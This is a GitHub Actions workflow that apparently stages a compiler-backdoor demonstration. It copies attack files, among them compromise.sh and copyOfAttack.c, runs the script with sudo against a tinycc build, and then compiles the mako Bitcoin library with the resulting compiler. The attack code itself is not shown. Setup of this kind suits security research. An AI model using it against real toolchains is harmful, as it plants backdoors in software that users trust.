name: C/C++ CI

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: configure
      run:  |
          #sudo apt update -y
          #sudo apt install gcc build-essential make tcc libtcc-dev -y
          sudo mkdir -p /home/sre/proj/tcc-vuln/target-mako #./configure
          cp compromise.sh /home/sre/proj/tcc-vuln/target-mako
          cp copyOfAttack.c /home/sre/proj/tcc-vuln/target-mako
          cp generate-attack-array.c /home/sre/proj/tcc-vuln/target-mako
          cd /home/sre/proj/tcc-vuln/target-mako
          gcc -o generate-attack-array generate-attack-array.c
          ls
          git clone https://github.com/montao/tinycc
          ls
          pwd
          mv tinycc/* .
          ./configure
          chmod +x compromise.sh
          sudo ./compromise.sh
          cd /tmp
          rm -rf tcctmp
          mkdir tcctmp
          cd tcctmp
          #printf 'press [ENTER] to continue ...'
          #read _

          wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/tcc/0.9.27+git20200814.62c30a4a-1/tcc_0.9.27+git20200814.62c30a4a.orig.tar.bz2
          #printf 'press [ENTER] to continue ...'
          #read _

          tar -xjvf tcc_0.9.27+git20200814.62c30a4a.orig.tar.bz2
          ./configure --cc=tcc
          #printf 'press [ENTER] to continue ...'
          #read _

          make 
          sudo make install
          rm -rf /tmp/makotmp
          mkdir /tmp/makotmp
          cd /tmp/makotmp
          #printf 'press [ENTER] to continue ...'
          #read _
          #tb1qxjz07xhqjkae59hj7qhw9q7k46l4qjyxt8jt0w
          git clone https://github.com/chjj/mako.git
          #printf 'press [ENTER] to continue ...'
          #read _

          cd mako
          ./autogen.sh
          ./configure CC=tcc
          pwd
          ls
    #- name: make
    #  run: make
    #- name: make check
    #  run: make check
    #- name: make distcheck
    #  run: make distcheck
